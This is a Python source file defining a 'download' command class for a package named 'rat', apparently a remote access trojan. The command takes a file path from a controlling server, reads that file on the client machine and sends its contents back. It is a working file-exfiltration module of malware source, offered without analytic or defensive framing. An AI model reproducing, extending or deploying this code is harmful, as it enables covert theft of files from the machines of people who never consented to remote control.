from pathlib import Path

from rat.commands.base_command import BaseCommand


class DownloadCommand(BaseCommand):

    name = "download"
    description = "Gather files from client and send them to server"

    def execute(self, args: str) -> str:

        if not args:

            return "ERROR\nNo file path provided\nEOF"

        path = Path(args.strip())

        if not path.exists():

            return f"ERROR\nFile not found: {path}\nEOF"

        if not path.is_file():

            return f"ERROR\nNot a file: {path}\nEOF"

        try:

            data = path.read_bytes()
            return "DOWNLOAD\nOK\n" + data.decode(errors="ignore") + "\nEOF"

        except Exception as e:

            return f"ERROR\n{e}\nEOF"
